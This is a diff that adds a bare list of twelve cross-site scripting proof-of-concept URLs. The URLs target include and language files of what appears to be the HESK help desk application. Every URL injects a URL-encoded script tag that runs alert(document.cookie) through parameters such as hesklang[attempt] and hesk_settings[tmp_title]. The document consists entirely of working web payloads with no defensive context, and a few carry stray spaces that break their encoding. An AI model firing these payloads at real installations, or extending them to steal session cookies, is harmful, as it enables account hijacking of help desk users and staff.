@@ -1,0 +1,12 @@
+http://www.example.com/inc/header.inc.php?hesk_settings[tmp_title]=%3C/title%3E%3Cscript%3Ealert%28document.cookie%29;% 3C/script%3E
+http://www.example.com/inc/header.inc.php?hesklang[ENCODING]=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/inc/assignment_search.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/scrip t%3E
+http://www.example.com/inc/attachments.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/inc/common.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/inc/database.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/inc/prepare_ticket_search.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/s cript%3E
+http://www.example.com/inc/print_tickets.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/inc/show_admin_nav.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3 E
+http://www.example.com/inc/show_search_form.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/script %3E
+http://www.example.com/inc/ticket_list.inc.php?hesklang[attempt]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/language/en/text.php/%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
